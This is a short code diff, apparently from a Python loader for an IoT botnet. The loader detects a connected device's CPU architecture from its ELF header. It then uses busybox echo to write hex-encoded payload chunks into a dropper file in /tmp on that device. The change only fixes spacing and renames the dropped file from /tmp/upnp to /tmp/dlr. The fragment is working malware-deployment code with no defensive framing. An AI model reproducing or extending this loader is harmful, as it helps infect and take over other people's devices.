@@ -26,7 +26,7 @@ def connection_consume_arch(rdbuff):
                 return "mpsl"
             else:
                 return "mips"
-        if ord(pbuff[18]) == 3 or ord(pbuff[18]) == 6 or ord(pbuff[18])== 7 or ord(pbuff[18]) == 62:
+        if ord(pbuff[18]) == 3 or ord(pbuff[18]) == 6 or ord(pbuff[18]) == 7 or ord(pbuff[18]) == 62:
             return "x86"
         if ord(pbuff[18]) == 2 or ord(pbuff[18]) == 18 or ord(pbuff[18]) == 43:
             return "spc"
@@ -41,7 +41,7 @@ def connection_consume_arch(rdbuff):
 
 def connection_load_dlr(conn, hex_payloads, pos):
     if pos < len(hex_payloads):
-        conn.send("/bin/busybox echo -ne \"{}\" {} /tmp/upnp; {}".format(hex_payloads[pos],
+        conn.send("/bin/busybox echo -ne \"{}\" {} /tmp/dlr; {}".format(hex_payloads[pos],
                                                                          '>' if pos == 0 else '>>',
                                                                          TOKEN_QUERY))
         return 0
